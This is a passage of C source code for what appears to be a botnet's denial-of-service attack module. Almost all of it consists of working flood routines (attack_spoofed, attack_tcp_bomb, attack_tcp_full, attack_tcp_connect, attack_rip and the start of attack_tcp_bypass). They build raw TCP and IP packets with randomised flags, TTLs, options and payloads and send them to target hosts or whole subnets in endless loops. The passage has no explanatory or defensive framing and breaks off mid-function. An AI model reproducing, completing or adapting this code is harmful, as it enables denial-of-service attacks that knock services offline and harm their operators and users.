                    sendto(rfd, packet, sizeof(struct iphdr) + sizeof(struct tcphdr) + data_len, MSG_NOSIGNAL, (struct sockaddr *)&targs[i].sock_addr, sizeof(struct sockaddr_in));
                    usleep(200);
                    iph->tot_len = htons(sizeof(struct iphdr) + sizeof(struct tcphdr));
                    tcph->psh = 0; tcph->syn = 0; tcph->ack = 1; tcph->fin = 0; tcph->rst = 0;
                    tcph->window = htons(0);
                    tcph->seq = htonl(seq + 2);
                    tcph->ack_seq = htonl(rand_next());
                    iph->check = 0; tcph->check = 0;
                    iph->check = checksum_generic((uint16_t *)iph, sizeof(struct iphdr));
                    tcph->check = checksum_tcpudp(iph, tcph, htons(sizeof(struct tcphdr)), sizeof(struct tcphdr));
                    sendto(rfd, packet, sizeof(struct iphdr) + sizeof(struct tcphdr), MSG_NOSIGNAL, (struct sockaddr *)&targs[i].sock_addr, sizeof(struct sockaddr_in));
                    usleep(1500);
                    int probe_len = 1 + (rand_next() % 3);
                    for (int k = 0; k < probe_len; k++) data[k] = 0x41 + (rand_next() % 26);
                    iph->tot_len = htons(sizeof(struct iphdr) + sizeof(struct tcphdr) + probe_len);
                    tcph->window = htons(64);
                    tcph->psh = 1; tcph->ack = 1;
                    iph->check = 0; tcph->check = 0;
                    iph->check = checksum_generic((uint16_t *)iph, sizeof(struct iphdr));
                    tcph->check = checksum_tcpudp(iph, tcph, htons(sizeof(struct tcphdr) + probe_len), sizeof(struct tcphdr) + probe_len);
                    sendto(rfd, packet, sizeof(struct iphdr) + sizeof(struct tcphdr) + probe_len, MSG_NOSIGNAL, (struct sockaddr *)&targs[i].sock_addr, sizeof(struct sockaddr_in));
                }
            }
        }
        if (elapsed >= duration)
            break;
        usleep(phase == 0 ? 10000 : 1000); 
    }
    close(rfd);
}
void attack_spoofed(uint8_t targs_len, struct attack_target *targs, uint8_t opts_len, struct attack_option *opts)
{
    int i, rfd;
    uint8_t ip_tos = attack_get_opt_int(opts_len, opts, ATK_OPT_IP_TOS, 0);
    uint8_t ip_ttl = attack_get_opt_int(opts_len, opts, ATK_OPT_IP_TTL, 64);
    port_t dport = attack_get_opt_int(opts_len, opts, ATK_OPT_DPORT, 80);
    int threads = attack_get_opt_int(opts_len, opts, ATK_OPT_THREADS, 32);
    int data_len = attack_get_opt_int(opts_len, opts, ATK_OPT_PAYLOAD_SIZE, 0);
    if ((rfd = socket(AF_INET, SOCK_RAW, IPPROTO_RAW)) == -1)
        return;
    i = 1;
    if (setsockopt(rfd, IPPROTO_IP, IP_HDRINCL, &i, sizeof (int)) == -1)
    {
        close(rfd);
        return;
    }
    while (TRUE)
    {
        for (i = 0; i < targs_len; i++)
        {
            int t;
            for (t = 0; t < threads; t++)
            {
                char packet[2048];
                struct iphdr *iph = (struct iphdr *)packet;
                struct tcphdr *tcph = (struct tcphdr *)(packet + sizeof(struct iphdr));
                uint8_t *opts_ptr = (uint8_t *)(tcph + 1);
                char *data = (char *)(opts_ptr + 20);
                ipv4_t target_ip;
                if (targs[i].netmask < 32)
                    target_ip = htonl(ntohl(targs[i].addr) + (((uint32_t)rand_next()) >> targs[i].netmask));
                else
                    target_ip = targs[i].addr;
                ipv4_t src_ip = LOCAL_ADDR;
                port_t src_port = (rand_next() % 60000) + 1024;
                uint32_t seq = rand_next();
                iph->version = 4;
                iph->ihl = 5;
                iph->tos = ip_tos;
                iph->tot_len = htons(sizeof(struct iphdr) + sizeof(struct tcphdr) + 20 + data_len);
                iph->id = htons(rand_next() & 0xffff);
                iph->frag_off = htons(0x4000);
                iph->ttl = ip_ttl;
                iph->protocol = IPPROTO_TCP;
                iph->check = 0;
                iph->saddr = src_ip;
                iph->daddr = target_ip;
                tcph->source = htons(src_port);
                tcph->dest = htons((dport == 0xffff) ? ((rand_next() % 60000) + 1024) : dport);
                tcph->seq = htonl(seq);
                tcph->ack_seq = 0;
                tcph->doff = 10; 
                tcph->syn = 1;
                tcph->ack = 0;
                tcph->psh = 0;
                tcph->rst = 0;
                tcph->fin = 0;
                tcph->urg = 0;
                tcph->window = htons(65535);
                tcph->check = 0;
                tcph->urg_ptr = 0;
                *opts_ptr++ = 2; *opts_ptr++ = 4; *((uint16_t *)opts_ptr) = htons(1400 + (rand_next() & 0x0f)); opts_ptr += 2;
                *opts_ptr++ = 4; *opts_ptr++ = 2;
                *opts_ptr++ = 8; *opts_ptr++ = 10; *((uint32_t *)opts_ptr) = rand_next(); opts_ptr += 4; *((uint32_t *)opts_ptr) = 0; opts_ptr += 4;
                *opts_ptr++ = 1; *opts_ptr++ = 3; *opts_ptr++ = 3; *opts_ptr++ = 6;
                int payload = 0;
                if (data_len > 0)
                {
                    payload = (data_len > 512) ? 512 : data_len;
                    for (int k = 0; k < payload; k++) data[k] = (k % 94) + 33;
                }
                iph->tot_len = htons(sizeof(struct iphdr) + sizeof(struct tcphdr) + 40 + payload);
                iph->check = checksum_generic((uint16_t *)iph, sizeof(struct iphdr));
                tcph->check = checksum_tcpudp(iph, tcph, htons(sizeof(struct tcphdr) + 40 + payload), sizeof(struct tcphdr) + 40 + payload);
                targs[i].sock_addr.sin_port = tcph->dest;
                sendto(rfd, packet, sizeof(struct iphdr) + sizeof(struct tcphdr) + 40 + payload, MSG_NOSIGNAL, (struct sockaddr *)&targs[i].sock_addr, sizeof(struct sockaddr_in));
            }
        }
        usleep(100);
    }
    close(rfd);
}
void attack_tcp_bomb(uint8_t targs_len, struct attack_target *targs, uint8_t opts_len, struct attack_option *opts)
{
    int i, rfd;
    port_t dport = attack_get_opt_int(opts_len, opts, ATK_OPT_DPORT, 80);
    int threads = attack_get_opt_int(opts_len, opts, ATK_OPT_THREADS, 64);
    int base_pkt_size = sizeof(struct iphdr) + sizeof(struct tcphdr);
    int min_pkt_size = base_pkt_size; 
    int max_pkt_size = base_pkt_size + 64; 
    if ((rfd = socket(AF_INET, SOCK_RAW, IPPROTO_RAW)) == -1)
    {
#ifdef DEBUG
        printf("[bomb] Failed to create raw socket\n");
#endif
        return;
    }
    i = 1;
    if (setsockopt(rfd, IPPROTO_IP, IP_HDRINCL, &i, sizeof(int)) == -1)
    {
#ifdef DEBUG
        printf("[bomb] Failed to set IP_HDRINCL\n");
#endif
        close(rfd);
        return;
    }
    struct {
        uint8_t syn, ack, rst, fin, psh, urg;
        const char *name;
    } flag_combos[] = {
        {1,0,0,0,0,0, "SYN"},
        {1,1,0,0,0,0, "SYN+ACK"},
        {0,1,0,0,0,0, "ACK"},
        {0,1,0,0,1,0, "ACK+PSH"},
        {0,0,1,0,0,0, "RST"},
        {0,0,0,1,0,0, "FIN"},
        {0,1,0,1,0,0, "FIN+ACK"},
        {0,1,0,0,0,1, "ACK+URG"},
        {1,1,0,0,1,0, "SYN+ACK+PSH"},
        {0,1,0,0,1,1, "ACK+PSH+URG"},
        {0,0,0,0,1,1, "PSH+URG"},
        {1,0,0,0,1,1, "SYN+PSH+URG"},
    };
    int flag_combo_count = sizeof(flag_combos) / sizeof(flag_combos[0]);
    int sndbuf = 4 * 1024 * 1024;
    setsockopt(rfd, SOL_SOCKET, SO_SNDBUF, &sndbuf, sizeof(sndbuf));
    int burst = 128;
    while (TRUE)
    {
        for (i = 0; i < targs_len; i++)
        {
            int t;
            for (t = 0; t < threads; t++)
            {
                char packet[256];
                struct iphdr *iph = (struct iphdr *)packet;
                struct tcphdr *tcph = (struct tcphdr *)(packet + sizeof(struct iphdr));
                uint8_t *opts_ptr = (uint8_t *)(tcph + 1);
                ipv4_t target_ip;
                if (targs[i].netmask < 32)
                    target_ip = htonl(ntohl(targs[i].addr) + (((uint32_t)rand_next()) >> targs[i].netmask));
                else
                    target_ip = targs[i].addr;
                ipv4_t src_ip = LOCAL_ADDR;
                port_t src_port = (rand_next() % 60000) + 1024;
                port_t dst_port = (dport == 0xffff) ? ((rand_next() % 60000) + 1024) : dport;
                uint32_t seq = rand_next();
                uint32_t ack = (rand_next() % 2) ? rand_next() : 0; 
                int flag_idx = rand_next() % flag_combo_count;
                uint8_t tcp_syn = flag_combos[flag_idx].syn;
                uint8_t tcp_ack = flag_combos[flag_idx].ack;
                uint8_t tcp_rst = flag_combos[flag_idx].rst;
                uint8_t tcp_fin = flag_combos[flag_idx].fin;
                uint8_t tcp_psh = flag_combos[flag_idx].psh;
                uint8_t tcp_urg = flag_combos[flag_idx].urg;
                uint8_t ip_ttl = 30 + (rand_next() % 226);
                uint8_t ip_tos;
                uint8_t tos_variants[] = {0x00, 0x08, 0x10, 0x18, 0x20, 0x28, 0x30, 0x38};
                ip_tos = tos_variants[rand_next() % (sizeof(tos_variants)/sizeof(tos_variants[0]))];
                uint16_t ip_id = rand_next() & 0xFFFF;
                uint16_t frag_flags = 0x4000; 
                if (rand_next() % 4 == 0) 
                    frag_flags = 0x0000;
                if (rand_next() % 10 == 0) 
                    frag_flags = 0x2000;
                int total_pkt_size = min_pkt_size + (rand_next() % (max_pkt_size - min_pkt_size + 1));
                int pkt_data_len = total_pkt_size - base_pkt_size;
                int tcp_opts_len = 0;
                int use_opts = rand_next() % 3; 
                if (use_opts == 0 && pkt_data_len >= 4)
                {
                    int opts_pattern = rand_next() % 4;
                    switch(opts_pattern)
                    {
                        case 0: 
                            tcp_opts_len = 4;
                            *opts_ptr++ = 2; *opts_ptr++ = 4;
                            *((uint16_t *)opts_ptr) = htons(1400 + (rand_next() % 100));
                            opts_ptr += 2;
                            tcph->doff = 6; 
                            break;
                        case 1: 
                            tcp_opts_len = 8;
                            *opts_ptr++ = 2; *opts_ptr++ = 4;
                            *((uint16_t *)opts_ptr) = htons(1400 + (rand_next() % 100));
                            opts_ptr += 2;
                            *opts_ptr++ = 3; *opts_ptr++ = 3;
                            *opts_ptr++ = rand_next() % 14 + 1;
                            *opts_ptr++ = 1; 
                            tcph->doff = 8; 
                            break;
                        case 2: 
                            if (pkt_data_len >= 12)
                            {
                                tcp_opts_len = 12;
                                *opts_ptr++ = 2; *opts_ptr++ = 4;
                                *((uint16_t *)opts_ptr) = htons(1400 + (rand_next() % 100));
                                opts_ptr += 2;
                                *opts_ptr++ = 8; *opts_ptr++ = 10;
                                *((uint32_t *)opts_ptr) = rand_next();
                                opts_ptr += 4;
                                *((uint32_t *)opts_ptr) = rand_next();
                                opts_ptr += 4;
                                tcph->doff = 10; 
                            }
                            break;
                        case 3: 
                            if (pkt_data_len >= 20)
                            {
                                tcp_opts_len = 20;
                                *opts_ptr++ = 2; *opts_ptr++ = 4;
                                *((uint16_t *)opts_ptr) = htons(1400 + (rand_next() % 100));
                                opts_ptr += 2;
                                *opts_ptr++ = 4; *opts_ptr++ = 2; 
                                *opts_ptr++ = 8; *opts_ptr++ = 10;
                                *((uint32_t *)opts_ptr) = rand_next();
                                opts_ptr += 4;
                                *((uint32_t *)opts_ptr) = rand_next();
                                opts_ptr += 4;
                                *opts_ptr++ = 3; *opts_ptr++ = 3;
                                *opts_ptr++ = rand_next() % 14 + 1;
                                *opts_ptr++ = 0; 
                                tcph->doff = 10; 
                            }
                            break;
                    }
                }
                else
                {
                    tcph->doff = 5; 
                }
                int payload_len = (pkt_data_len > tcp_opts_len) ? (pkt_data_len - tcp_opts_len) : 0;
                int total_pkt_len = base_pkt_size + tcp_opts_len + payload_len;
                iph->version = 4;
                iph->ihl = 5;
                iph->tos = ip_tos;
                iph->tot_len = htons(total_pkt_len);
                iph->id = htons(ip_id);
                iph->frag_off = htons(frag_flags);
                iph->ttl = ip_ttl;
                iph->protocol = IPPROTO_TCP;
                iph->check = 0;
                iph->saddr = src_ip;
                iph->daddr = target_ip;
                tcph->source = htons(src_port);
                tcph->dest = htons(dst_port);
                tcph->seq = htonl(seq);
                tcph->ack_seq = htonl(ack);
                tcph->syn = tcp_syn;
                tcph->ack = tcp_ack;
                tcph->rst = tcp_rst;
                tcph->fin = tcp_fin;
                tcph->psh = tcp_psh;
                tcph->urg = tcp_urg;
                uint16_t window_variants[] = {1024, 2048, 4096, 8192, 16384, 32768, 65535};
                tcph->window = htons(window_variants[rand_next() % (sizeof(window_variants)/sizeof(window_variants[0]))]);
                tcph->check = 0;
                tcph->urg_ptr = tcp_urg ? htons(rand_next() & 0xFFFF) : 0;
                if (payload_len > 0)
                {
                    char *data = (char *)opts_ptr;
                    for (int k = 0; k < payload_len; k++)
                        data[k] = (rand_next() % 94) + 33; 
                }
                iph->check = checksum_generic((uint16_t *)iph, sizeof(struct iphdr));
                tcph->check = checksum_tcpudp(iph, tcph, htons(sizeof(struct tcphdr) + tcp_opts_len + payload_len), 
                                              sizeof(struct tcphdr) + tcp_opts_len + payload_len);
                targs[i].sock_addr.sin_family = AF_INET;
                targs[i].sock_addr.sin_addr.s_addr = target_ip;
                targs[i].sock_addr.sin_port = tcph->dest;
                for (int b = 0; b < burst; b++)
                {
                    iph->id = htons(rand_next() & 0xFFFF);
                    iph->ttl = 30 + (rand_next() % 226);
                    tcph->seq = htonl(seq + b);
                    tcph->source = htons(src_port + b);
                    iph->check = 0;
                    iph->check = checksum_generic((uint16_t *)iph, sizeof(struct iphdr));
                    tcph->check = 0;
                    tcph->check = checksum_tcpudp(iph, tcph, htons(sizeof(struct tcphdr) + tcp_opts_len + payload_len), 
                                                  sizeof(struct tcphdr) + tcp_opts_len + payload_len);
                    sendto(rfd, packet, total_pkt_len, MSG_NOSIGNAL, (struct sockaddr *)&targs[i].sock_addr, sizeof(struct sockaddr_in));
                }
            }
        }
    }
    close(rfd);
}
void attack_tcp_full(uint8_t targs_len, struct attack_target *targs, uint8_t opts_len, struct attack_option *opts)
{
    int i, rfd;
    int threads = attack_get_opt_int(opts_len, opts, ATK_OPT_THREADS, 128);
    port_t opt_dport = attack_get_opt_int(opts_len, opts, ATK_OPT_DPORT, 80);
    port_t opt_sport = attack_get_opt_int(opts_len, opts, ATK_OPT_SPORT, 0xffff);
    uint8_t base_ttl = attack_get_opt_int(opts_len, opts, ATK_OPT_IP_TTL, 64);
    int payload_size = attack_get_opt_int(opts_len, opts, ATK_OPT_PAYLOAD_SIZE, 96);
    int ratelimit = attack_get_opt_int(opts_len, opts, ATK_OPT_RATELIMIT, 0);
    if (payload_size < 32)
        payload_size = 32;
    if (payload_size > 512)
        payload_size = 512;
    if ((rfd = socket(AF_INET, SOCK_RAW, IPPROTO_RAW)) == -1)
        return;
    i = 1;
    if (setsockopt(rfd, IPPROTO_IP, IP_HDRINCL, &i, sizeof(int)) == -1)
    {
        close(rfd);
        return;
    }
    int sndbuf = 4 * 1024 * 1024;
    setsockopt(rfd, SOL_SOCKET, SO_SNDBUF, &sndbuf, sizeof(sndbuf));
    static const struct {
        uint8_t tos;
        uint8_t ttl_min;
        uint8_t ttl_max;
        uint16_t window;
    } profiles[] = {
        {0x00, 40, 72, 64240},
        {0x10, 48, 96, 32768},
        {0x08, 52, 92, 49152},
        {0x18, 64, 120, 65535},
        {0x28, 44, 88, 16384},
    };
    const int profile_cnt = sizeof(profiles) / sizeof(profiles[0]);
    char payload_pool[512];
    for (i = 0; i < payload_size; i++)
        payload_pool[i] = (rand_next() % 94) + 33;
    while (TRUE)
    {
        for (i = 0; i < targs_len; i++)
        {
            int t;
            for (t = 0; t < threads; t++)
            {
                ipv4_t target_ip;
                struct sockaddr_in target_addr = targs[i].sock_addr;
                uint32_t seq_start = rand_next();
                uint32_t ack_seed = rand_next();
                int profile_idx = rand_next() % profile_cnt;
                uint8_t ttl_range = profiles[profile_idx].ttl_max - profiles[profile_idx].ttl_min;
                int ttl_val = profiles[profile_idx].ttl_min + (ttl_range ? (rand_next() % (ttl_range + 1)) : 0);
                ttl_val += ((int)base_ttl - 64);
                if (ttl_val < 32)
                    ttl_val = 32;
                if (ttl_val > 255)
                    ttl_val = 255;
                if (targs[i].netmask < 32)
                    target_ip = htonl(ntohl(targs[i].addr) + (((uint32_t)rand_next()) >> targs[i].netmask));
                else
                    target_ip = targs[i].addr;
                target_addr.sin_family = AF_INET;
                target_addr.sin_addr.s_addr = target_ip;
                port_t dst_port = (opt_dport == 0xffff) ? ((rand_next() % 60000) + 1024) : opt_dport;
                port_t src_port = (opt_sport == 0xffff) ? ((rand_next() % 60000) + 1024) : opt_sport;
                target_addr.sin_port = htons(dst_port);
                char packet[2048];
                struct iphdr *iph = (struct iphdr *)packet;
                struct tcphdr *tcph = (struct tcphdr *)(packet + sizeof(struct iphdr));
                uint8_t *opts_ptr = (uint8_t *)(tcph + 1);
                char *data = (char *)(tcph + 1);
                memset(packet, 0, sizeof(struct iphdr) + sizeof(struct tcphdr) + 20 + payload_size);
                iph->version = 4;
                iph->ihl = 5;
                iph->tos = profiles[profile_idx].tos;
                iph->tot_len = htons(sizeof(struct iphdr) + sizeof(struct tcphdr) + 20);
                iph->id = htons(rand_next() & 0xffff);
                iph->frag_off = htons(0x4000);
                iph->ttl = (uint8_t)ttl_val;
                iph->protocol = IPPROTO_TCP;
                iph->saddr = LOCAL_ADDR;
                iph->daddr = target_ip;
                tcph->source = htons(src_port);
                tcph->dest = htons(dst_port);
                tcph->seq = htonl(seq_start);
                tcph->ack_seq = 0;
                tcph->doff = 10;
                tcph->syn = 1;
                tcph->window = htons(profiles[profile_idx].window);
                opts_ptr[0] = 2; opts_ptr[1] = 4; *((uint16_t *)(opts_ptr + 2)) = htons(1460 + (rand_next() % 120));
                opts_ptr[4] = 4; opts_ptr[5] = 2;
                opts_ptr[6] = 8; opts_ptr[7] = 10;
                *((uint32_t *)(opts_ptr + 8)) = rand_next();
                *((uint32_t *)(opts_ptr + 12)) = rand_next();
                opts_ptr[16] = 3; opts_ptr[17] = 3; opts_ptr[18] = 6 + (rand_next() & 0x1);
                opts_ptr[19] = 1;
                iph->check = checksum_generic((uint16_t *)iph, sizeof(struct iphdr));
                tcph->check = checksum_tcpudp(iph, tcph, htons(sizeof(struct tcphdr) + 20), sizeof(struct tcphdr) + 20);
                sendto(rfd, packet, sizeof(struct iphdr) + sizeof(struct tcphdr) + 20, MSG_NOSIGNAL, (struct sockaddr *)&target_addr, sizeof(target_addr));
                attack_stats_inc(0, sizeof(struct iphdr) + sizeof(struct tcphdr) + 20);
                if ((rand_next() & 0x1f) == 0)
                    usleep(rand_next() % 200);
                iph->tot_len = htons(sizeof(struct iphdr) + sizeof(struct tcphdr));
                iph->id = htons(rand_next() & 0xffff);
                iph->check = 0;
                iph->check = checksum_generic((uint16_t *)iph, sizeof(struct iphdr));
                tcph->seq = htonl(seq_start + 1);
                tcph->ack_seq = htonl(ack_seed);
                tcph->doff = 5;
                tcph->syn = 0;
                tcph->ack = 1;
                tcph->psh = 0;
                tcph->fin = 0;
                tcph->rst = 0;
                tcph->urg = 0;
                tcph->check = 0;
                tcph->check = checksum_tcpudp(iph, tcph, htons(sizeof(struct tcphdr)), sizeof(struct tcphdr));
                sendto(rfd, packet, sizeof(struct iphdr) + sizeof(struct tcphdr), MSG_NOSIGNAL, (struct sockaddr *)&target_addr, sizeof(target_addr));
                attack_stats_inc(0, sizeof(struct iphdr) + sizeof(struct tcphdr));
                if ((rand_next() & 0x1f) == 0)
                    usleep(rand_next() % 150);
                int pcount = 3 + (rand_next() % 3);
                int seq_delta = 1;
                for (int b = 0; b < pcount; b++)
                {
                    int chunk = payload_size - (rand_next() % 24);
                    if (chunk < 24)
                        chunk = 24;
                    rand_str(payload_pool, chunk);
                    iph->tot_len = htons(sizeof(struct iphdr) + sizeof(struct tcphdr) + chunk);
                    iph->id = htons(rand_next() & 0xffff);
                    iph->check = 0;
                    tcph->seq = htonl(seq_start + seq_delta);
                    tcph->ack_seq = htonl(ack_seed + (rand_next() & 0xfff));
                    tcph->ack = 1;
                    tcph->psh = 1;
                    tcph->fin = 0;
                    tcph->rst = 0;
                    tcph->urg = 0;
                    memcpy(data, payload_pool, chunk);
                    iph->check = checksum_generic((uint16_t *)iph, sizeof(struct iphdr));
                    tcph->check = 0;
                    tcph->check = checksum_tcpudp(iph, tcph, htons(sizeof(struct tcphdr) + chunk), sizeof(struct tcphdr) + chunk);
                    sendto(rfd, packet, sizeof(struct iphdr) + sizeof(struct tcphdr) + chunk, MSG_NOSIGNAL, (struct sockaddr *)&target_addr, sizeof(target_addr));
                    attack_stats_inc(0, sizeof(struct iphdr) + sizeof(struct tcphdr) + chunk);
                    seq_delta += chunk;
                    if ((rand_next() & 0x7) == 0)
                        usleep(rand_next() % 120);
                }
                iph->tot_len = htons(sizeof(struct iphdr) + sizeof(struct tcphdr));
                iph->id = htons(rand_next() & 0xffff);
                iph->check = 0;
                tcph->seq = htonl(seq_start + seq_delta);
                tcph->ack_seq = htonl(ack_seed + (rand_next() & 0xffff));
                tcph->psh = 0;
                tcph->fin = 1;
                tcph->ack = 1;
                tcph->urg = 0;
                tcph->check = 0;
                tcph->check = checksum_tcpudp(iph, tcph, htons(sizeof(struct tcphdr)), sizeof(struct tcphdr));
                sendto(rfd, packet, sizeof(struct iphdr) + sizeof(struct tcphdr), MSG_NOSIGNAL, (struct sockaddr *)&target_addr, sizeof(target_addr));
                attack_stats_inc(0, sizeof(struct iphdr) + sizeof(struct tcphdr));
                if (ratelimit > 0)
                {
                    int sleep_us = (int)((double)(pcount + 3) * 1000000.0 / (double)ratelimit);
                    if (sleep_us > 0)
                        usleep(sleep_us);
                }
            }
        }
    }
    close(rfd);
}
void attack_tcp_connect(uint8_t targs_len, struct attack_target *targs, uint8_t opts_len, struct attack_option *opts)
{
    int i, rfd;
    port_t dport = attack_get_opt_int(opts_len, opts, ATK_OPT_DPORT, 80);
    int threads = attack_get_opt_int(opts_len, opts, ATK_OPT_THREADS, 64);
    int data_len = attack_get_opt_int(opts_len, opts, ATK_OPT_PAYLOAD_SIZE, 0); 
    int burst = 64;
    if ((rfd = socket(AF_INET, SOCK_RAW, IPPROTO_RAW)) == -1)
        return;
    i = 1;
    if (setsockopt(rfd, IPPROTO_IP, IP_HDRINCL, &i, sizeof(int)) == -1)
    {
        close(rfd);
        return;
    }
    int sndbuf = 4 * 1024 * 1024;
    setsockopt(rfd, SOL_SOCKET, SO_SNDBUF, &sndbuf, sizeof(sndbuf));
    char payload_data[1400];
    for (i = 0; i < sizeof(payload_data); i++)
        payload_data[i] = rand_next() & 0xFF;
    while (TRUE)
    {
        for (i = 0; i < targs_len; i++)
        {
            int t;
            for (t = 0; t < threads; t++)
            {
                char packet[2048];
                struct iphdr *iph = (struct iphdr *)packet;
                struct tcphdr *tcph = (struct tcphdr *)(packet + sizeof(struct iphdr));
                uint8_t *opts_ptr = (uint8_t *)(tcph + 1);
                char *data = (char *)(opts_ptr + 20);
                ipv4_t target_ip;
                if (targs[i].netmask < 32)
                    target_ip = htonl(ntohl(targs[i].addr) + (((uint32_t)rand_next()) >> targs[i].netmask));
                else
                    target_ip = targs[i].addr;
                port_t src_port = (rand_next() % 60000) + 1024;
                port_t dst_port = (dport == 0xffff) ? ((rand_next() % 60000) + 1024) : dport;
                uint32_t seq = rand_next();
                for (int b = 0; b < burst; b++)
                {
                    iph->version = 4;
                    iph->ihl = 5;
                    iph->tos = 0;
                    iph->tot_len = htons(sizeof(struct iphdr) + sizeof(struct tcphdr) + 20);
                    iph->id = htons(rand_next() & 0xFFFF);
                    iph->frag_off = htons(0x4000);
                    iph->ttl = 64;
                    iph->protocol = IPPROTO_TCP;
                    iph->check = 0;
                    iph->saddr = LOCAL_ADDR;
                    iph->daddr = target_ip;
                    tcph->source = htons(src_port + b);
                    tcph->dest = htons(dst_port);
                    tcph->seq = htonl(seq + b);
                    tcph->ack_seq = 0;
                    tcph->doff = 10;
                    tcph->syn = 1;
                    tcph->ack = 0;
                    tcph->rst = 0;
                    tcph->fin = 0;
                    tcph->psh = 0;
                    tcph->urg = 0;
                    tcph->window = htons(65535);
                    tcph->check = 0;
                    tcph->urg_ptr = 0;
                    opts_ptr[0] = 2; opts_ptr[1] = 4; *((uint16_t *)(opts_ptr + 2)) = htons(1460);
                    opts_ptr[4] = 4; opts_ptr[5] = 2;
                    opts_ptr[6] = 8; opts_ptr[7] = 10;
                    *((uint32_t *)(opts_ptr + 8)) = htonl(rand_next());
                    *((uint32_t *)(opts_ptr + 12)) = 0;
                    opts_ptr[16] = 3; opts_ptr[17] = 3; opts_ptr[18] = 7;
                    opts_ptr[19] = 1;
                    iph->check = checksum_generic((uint16_t *)iph, sizeof(struct iphdr));
                    tcph->check = checksum_tcpudp(iph, tcph, htons(sizeof(struct tcphdr) + 20), sizeof(struct tcphdr) + 20);
                    targs[i].sock_addr.sin_family = AF_INET;
                    targs[i].sock_addr.sin_addr.s_addr = target_ip;
                    targs[i].sock_addr.sin_port = tcph->dest;
                    sendto(rfd, packet, sizeof(struct iphdr) + sizeof(struct tcphdr) + 20, MSG_NOSIGNAL, (struct sockaddr *)&targs[i].sock_addr, sizeof(struct sockaddr_in));
                    if (b < burst - 1)
                        usleep(rand_next() % 201);
                }
                if (data_len > 0)
                {
                    int total_len = sizeof(struct iphdr) + sizeof(struct tcphdr) + data_len;
                    memcpy(data, payload_data, data_len);
                    for (int b = 0; b < burst; b++)
                    {
                        iph->tot_len = htons(total_len);
                        iph->id = htons(rand_next() & 0xFFFF);
                        iph->check = 0;
                        tcph->syn = 0;
                        tcph->ack = 1;
                        tcph->psh = 1;
                        tcph->seq = htonl(seq + 1 + b);
                        tcph->ack_seq = htonl(seq + 1 + b);
                        tcph->doff = 5;
                        tcph->source = htons(src_port + b);
                        iph->check = checksum_generic((uint16_t *)iph, sizeof(struct iphdr));
                        tcph->check = 0;
                        tcph->check = checksum_tcpudp(iph, tcph, htons(sizeof(struct tcphdr) + data_len), sizeof(struct tcphdr) + data_len);
                        sendto(rfd, packet, total_len, MSG_NOSIGNAL, (struct sockaddr *)&targs[i].sock_addr, sizeof(struct sockaddr_in));
                        if (b < burst - 1)
                            usleep(rand_next() % 201);
                    }
                }
            }
        }
        usleep(rand_next() % 201); 
    }
    close(rfd);
}
void attack_rip(uint8_t targs_len, struct attack_target *targs, uint8_t opts_len, struct attack_option *opts)
{
    int i, rfd;
    int threads = attack_get_opt_int(opts_len, opts, ATK_OPT_THREADS, 128);
    int data_len = attack_get_opt_int(opts_len, opts, ATK_OPT_PAYLOAD_SIZE, 64);
    uint8_t protocols[] = {
        IPPROTO_ICMP, IPPROTO_IGMP, IPPROTO_IPIP,
        6, IPPROTO_UDP, 41, 47, 50, 51, 58, 94, 103, 108, 132, 255
    };
    int protocol_count = sizeof(protocols) / sizeof(protocols[0]);
    if ((rfd = socket(AF_INET, SOCK_RAW, IPPROTO_RAW)) == -1)
        return;
    i = 1;
    if (setsockopt(rfd, IPPROTO_IP, IP_HDRINCL, &i, sizeof(int)) == -1)
    {
        close(rfd);
        return;
    }
    int sndbuf = 4 * 1024 * 1024;
    setsockopt(rfd, SOL_SOCKET, SO_SNDBUF, &sndbuf, sizeof(sndbuf));
    int burst = 64;
    while (TRUE)
    {
        for (i = 0; i < targs_len; i++)
        {
            int t;
            for (t = 0; t < threads; t++)
            {
                char packet[1500];
                struct iphdr *iph = (struct iphdr *)packet;
                char *data = (char *)(iph + 1);
                ipv4_t target_ip;
                if (targs[i].netmask < 32)
                    target_ip = htonl(ntohl(targs[i].addr) + (((uint32_t)rand_next()) >> targs[i].netmask));
                else
                    target_ip = targs[i].addr;
                uint8_t protocol = protocols[rand_next() % protocol_count];
                int pkt_size = sizeof(struct iphdr) + data_len;
                iph->version = 4;
                iph->ihl = 5;
                iph->tos = rand_next() & 0xFF;
                iph->tot_len = htons(pkt_size);
                iph->id = htons(rand_next() & 0xFFFF);
                iph->frag_off = htons(0x4000);
                iph->ttl = 30 + (rand_next() % 226);
                iph->protocol = protocol;
                iph->check = 0;
                iph->saddr = LOCAL_ADDR;
                iph->daddr = target_ip;
                if (data_len > 0)
                {
                    int j;
                    for (j = 0; j < data_len; j++)
                        data[j] = rand_next() & 0xFF;
                }
                iph->check = checksum_generic((uint16_t *)iph, sizeof(struct iphdr));
                targs[i].sock_addr.sin_family = AF_INET;
                targs[i].sock_addr.sin_addr.s_addr = target_ip;
                targs[i].sock_addr.sin_port = 0;
                for (int b = 0; b < burst; b++)
                {
                    iph->id = htons(rand_next() & 0xFFFF);
                    iph->protocol = protocols[rand_next() % protocol_count];
                    iph->check = 0;
                    iph->check = checksum_generic((uint16_t *)iph, sizeof(struct iphdr));
                    sendto(rfd, packet, pkt_size, MSG_NOSIGNAL, (struct sockaddr *)&targs[i].sock_addr, sizeof(struct sockaddr_in));
                    if (b < burst - 1)
                        usleep(rand_next() % 201);
                }
            }
        }
        usleep(rand_next() % 201); 
    }
    close(rfd);
}
void attack_tcp_bypass(uint8_t targs_len, struct attack_target *targs, uint8_t opts_len, struct attack_option *opts)
{
    int i, rfd;
    port_t dport = attack_get_opt_int(opts_len, opts, ATK_OPT_DPORT, 80);
    int threads = attack_get_opt_int(opts_len, opts, ATK_OPT_THREADS, 128);
    uint8_t base_ttl = attack_get_opt_int(opts_len, opts, ATK_OPT_IP_TTL, 64);
    int ratelimit = attack_get_opt_int(opts_len, opts, ATK_OPT_RATELIMIT, 0);
    if ((rfd = socket(AF_INET, SOCK_RAW, IPPROTO_RAW)) == -1)
        return;
    i = 1;
    if (setsockopt(rfd, IPPROTO_IP, IP_HDRINCL, &i, sizeof(int)) == -1)
    {
        close(rfd);
        return;
    }
    int sndbuf = 4 * 1024 * 1024;
    setsockopt(rfd, SOL_SOCKET, SO_SNDBUF, &sndbuf, sizeof(sndbuf));
    int burst = 128;
    while (TRUE)
    {
        for (i = 0; i < targs_len; i++)
        {
            int t;
            for (t = 0; t < threads; t++)
            {
                char packet[256];
                struct iphdr *iph = (struct iphdr *)packet;
                struct tcphdr *tcph = (struct tcphdr *)(packet + sizeof(struct iphdr));
                ipv4_t target_ip;
                if (targs[i].netmask < 32)
